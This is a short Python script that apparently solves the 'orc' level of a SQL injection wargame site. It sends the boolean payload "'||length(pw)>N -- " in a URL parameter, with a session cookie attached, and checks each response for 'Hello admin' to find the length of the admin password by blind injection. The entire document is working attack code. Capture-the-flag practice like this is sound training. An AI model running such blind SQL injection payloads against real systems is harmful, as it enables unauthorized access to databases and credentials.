import urllib.request 
from urllib.parse import quote

for i in range(1, 10):
        url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
        query = "'||length(pw)>{} -- ".format(i)
        query = quote(query)
        new_url = url + query

        re = urllib.request.Request(new_url)
        re.add_header("Cookie", "< My Cookie value >")
        response = urllib.request.urlopen(re)

        if str(response.read()).find("Hello admin") != -1:
            print("Found length!! => {}".format(i))
        else:
            print("{}".format(i))
print("Finish")
